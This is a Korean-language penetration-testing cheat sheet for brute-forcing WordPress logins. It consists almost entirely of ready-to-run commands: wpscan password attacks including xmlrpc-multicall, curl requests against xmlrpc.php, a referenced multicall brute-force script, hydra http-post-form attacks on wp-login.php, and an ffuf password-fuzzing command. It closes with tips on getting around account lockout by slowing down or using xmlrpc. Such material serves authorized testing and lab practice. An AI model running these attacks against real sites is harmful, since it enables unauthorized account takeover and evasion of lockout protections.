## wpscan 브루트포스

```bash
# 단일 사용자
wpscan --url http://<IP> \
  --usernames admin \
  --passwords /usr/share/wordlists/rockyou.txt \
  --max-threads 5

# 여러 사용자
wpscan --url http://<IP> \
  -U users.txt \
  -P /usr/share/wordlists/rockyou.txt \
  --max-threads 3

# xmlrpc multicall (1 요청에 수백 개 시도 — 매우 빠름)
wpscan --url http://<IP> \
  -U admin -P passwords.txt \
  --password-attack xmlrpc-multicall

# wp-login 직접 공격
wpscan --url http://<IP> \
  -U admin -P passwords.txt \
  --password-attack wp-login
```

## xmlrpc.php 직접 악용

```bash
# xmlrpc 활성 여부 확인
curl -X POST \
  -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" \
  http://<IP>/xmlrpc.php

# wp.getUsersBlogs 인증 테스트 (단일)
curl -X POST \
  -d "<methodCall><methodName>wp.getUsersBlogs</methodName>
      <params>
        <param><value>admin</value></param>
        <param><value>password123</value></param>
      </params></methodCall>" \
  http://<IP>/xmlrpc.php

# multicall 브루트포스 스크립트 (파이썬)
# https://github.com/1N3/WordPress-XMLRPC-Brute-Force-Exploit
python3 xmlrpc-bruteforce.py http://<IP>/xmlrpc.php admin rockyou.txt
```

## hydra

```bash
# wp-login.php 직접
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:ERROR"

# 쿠키 포함 (testcookie 필요한 경우)
hydra -l admin -P rockyou.txt <IP> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" \
  -H "Cookie: wordpress_test_cookie=WP+Cookie+check"
```

## ffuf

```bash
ffuf -u http://<IP>/wp-login.php -X POST \
  -d "log=admin&pwd=FUZZ&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 200 -fs 1234
```

## 팁

- wpscan의 `xmlrpc-multicall`이 가장 빠름 (1 요청에 최대 999개 패스워드)
- 락아웃 설정 있는 경우 → 느리게 시도하거나 xmlrpc 우회
- `fasttrack.txt` 로 먼저 빠른 테스트 후 rockyou.txt
